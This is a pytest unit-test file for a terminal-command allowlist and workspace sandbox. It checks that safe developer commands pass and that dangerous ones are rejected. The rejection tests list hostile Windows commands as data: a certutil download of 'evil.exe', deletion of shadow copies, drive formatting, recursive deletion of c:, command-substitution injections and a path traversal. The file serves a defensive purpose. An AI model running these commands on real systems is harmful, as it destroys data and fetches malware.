"""Unit tests for the execution allowlist and workspace sandboxing."""
from pathlib import Path
import pytest

from src.servers.files_server import (
    validate_terminal_command,
    execute_terminal_command,
)


def test_validate_allowed_commands(tmp_path: Path) -> None:
    allowed_samples = [
        "python -c \"print('hello')\"",
        "python.exe script.py",
        "pytest tests/unit",
        "git status",
        "git diff",
        "git log -n 5",
        "dir src",
        "echo testing sandbox",
        "pip list",
        "pip3 list",
        "npm test",
        "npx eslint .",
        "ruff check .",
    ]
    for cmd in allowed_samples:
        valid, reason = validate_terminal_command(cmd, tmp_path)
        assert valid is True, f"Expected '{cmd}' to be valid, but got: {reason}"


def test_validate_chained_allowed_commands(tmp_path: Path) -> None:
    cmd = "python -c \"print(1)\" && git status"
    valid, reason = validate_terminal_command(cmd, tmp_path)
    assert valid is True, reason


def test_reject_unallowed_binary(tmp_path: Path) -> None:
    blocked_samples = [
        "regedit",
        "powershell -NoProfile -Command Write-Host hi",
        "cmd.exe /c whoami",
        "certutil -urlcache -split -f http://example.com/evil.exe",
        "vssadmin delete shadows /all",
        "format d:",
        "shutdown /s /t 0",
        "del /f /s /q c:",
    ]
    for cmd in blocked_samples:
        valid, reason = validate_terminal_command(cmd, tmp_path)
        assert valid is False, f"Expected '{cmd}' to be rejected, but it was allowed!"
        assert ("rejected" in reason.lower() or "allowlist" in reason.lower())


def test_reject_dangerous_operators(tmp_path: Path) -> None:
    blocked_samples = [
        "python $(whoami)",
        "pytest `echo bad`",
        "python ${USER}",
    ]
    for cmd in blocked_samples:
        valid, reason = validate_terminal_command(cmd, tmp_path)
        assert valid is False
        assert "substitution" in reason.lower()


def test_reject_path_traversal_outside_workspace(tmp_path: Path) -> None:
    cmd = "python ../../../Windows/System32/calc.exe"
    valid, reason = validate_terminal_command(cmd, tmp_path)
    assert valid is False
    assert "rejected" in reason.lower()


def test_execute_terminal_command_success(tmp_path: Path) -> None:
    res = execute_terminal_command("python -c \"print('sandbox ok')\"", root_dir=tmp_path)
    assert res["status"] == "success"
    assert "sandbox ok" in res["stdout"]


def test_execute_terminal_command_rejected_by_sandbox(tmp_path: Path) -> None:
    res = execute_terminal_command("regedit.exe", root_dir=tmp_path)
    assert res["status"] == "error"
    assert "rejected by sandbox allowlist" in res["message"]
